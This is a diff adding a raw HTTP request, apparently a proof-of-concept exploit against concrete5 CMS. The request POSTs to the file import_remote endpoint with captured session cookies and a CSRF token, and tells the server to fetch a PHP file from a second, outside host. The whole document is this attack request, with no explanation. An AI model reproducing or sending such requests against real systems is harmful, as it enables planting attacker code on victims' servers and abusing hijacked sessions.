@@ -1,0 +1,16 @@
+POST /concrete5/index.php/ccm/system/file/import_remote HTTP/1.1
+Host: 13.40.10.158
+Content-Length: 139
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://13.40.10.158
+Referer: http://13.40.10.158/concrete5/index.php/dashboard/files/search
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: CONCRETE5=610kr3skp4dka3ofjd9en1cpvi; CONCRETE5_LOGIN=1; ccmAuthUserHash=1%3Aconcrete%3Aec6f7b77447d30329e50850f46e9daed
+Connection: close
+
+ccm_token=1635524530%3A3d2c793cfaf3db5ad88e67f2f0852af3&url_upload=http%3A%2F%2F18.169.191.114%2Ftest.php&__ccm_consider_request_as_xhr=1
+
